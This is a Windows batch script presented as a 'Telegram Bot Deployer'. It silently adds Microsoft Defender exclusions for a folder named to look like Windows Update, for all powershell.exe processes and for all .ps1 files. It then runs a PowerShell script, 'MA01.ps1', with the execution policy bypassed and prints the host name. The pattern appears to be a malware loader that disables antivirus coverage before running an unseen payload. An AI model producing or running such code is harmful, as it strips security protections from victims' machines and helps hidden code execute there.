@echo off
title Telegram Bot Deployer
color 0A

setlocal enabledelayedexpansion
set "SCRIPT_DIR=%~dp0"

:: ============================================================
:: SELECT WHICH SCRIPT TO RUN
:: ============================================================
set "SELECTED=MA01.ps1"
set "LABEL=Maraki Lab 1"

echo ========================================
echo    TELEGRAM BOT DEPLOYER
echo ========================================
echo.

:: Optional Defender exclusions (skip if not admin - won't error)
powershell -NoProfile -Command "try { Add-MpPreference -ExclusionPath 'C:\ProgramData\WindowUpdate' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.ps1' -ErrorAction SilentlyContinue } catch {}"
echo [INFO] Defender exclusions added (if admin).
echo.

set "FOUND_SCRIPT=%SCRIPT_DIR%%SELECTED%"

if not exist "%FOUND_SCRIPT%" (
    echo [ERROR] Script not found: %FOUND_SCRIPT%
    exit /b 1
)

echo [INFO] Selected: %LABEL% (%SELECTED%)
echo [INFO] Deploying...
echo.

:: Run the script - no prompts, no pause, no bot
powershell -NoProfile -ExecutionPolicy Bypass -File "%FOUND_SCRIPT%"
set "RC=%errorlevel%"

if %RC% equ 0 (
    echo.
    echo ========================================
    echo    DEPLOYMENT SUCCESSFUL
    echo ========================================
    echo [INFO] Host: %COMPUTERNAME%
    echo.
) else (
    echo.
    echo ========================================
    echo    DEPLOYMENT FAILED (exit %RC%)
    echo ========================================
    echo.
)

exit /b %RC%
